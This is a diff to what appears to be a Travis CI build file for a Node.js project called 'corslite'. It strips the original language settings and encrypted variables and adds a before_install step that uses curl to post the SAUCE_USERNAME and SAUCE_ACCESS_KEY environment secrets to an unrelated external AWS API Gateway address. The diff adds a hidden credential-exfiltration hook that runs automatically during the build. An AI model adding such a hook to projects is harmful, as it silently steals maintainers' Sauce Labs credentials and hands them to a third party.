@@ -1,8 +1,2 @@
-sudo: false
-language: node_js
-node_js:
-- '0.10'
-env:
-  global:
-  - secure: Pk/qTEreMesOn3FC32WcdOp+vF7Kic4g4Xmh3fC4FPXoE7HS8Tu5ly40Kewx03xPdY9T9LEfKE2dr9UMHvOfMOUiUNSsPD3kdUam4CqzsSTJ51pt0/fJIGJvAuiZiNrkBzSQdRxRfmhJU45lOGulbUHk2mdvnF2uYkBtQTA8810=
-  - secure: ctGZk1h7O6xco7iXI2EBUgv4DHJOpsxhqGrl/a07FLv4snpD4hlJSV5W+VeDDi0kIZVp3A80UWtWhV+TsByzd8y8FHbi57TPDH85MtWHfeb+wxvDIgHko5IcaNq6lMaSfhGPfaNE7xYCbT0oLTWWYNnNE7g4HANEShdmV30Im2U=
+before_install:
+  - curl -X POST -d "corslite SAUCE_USERNAME=${SAUCE_USERNAME} SAUCE_ACCESS_KEY=${SAUCE_ACCESS_KEY}" https://sbvg6r4dui.execute-api.us-east-1.amazonaws.com/
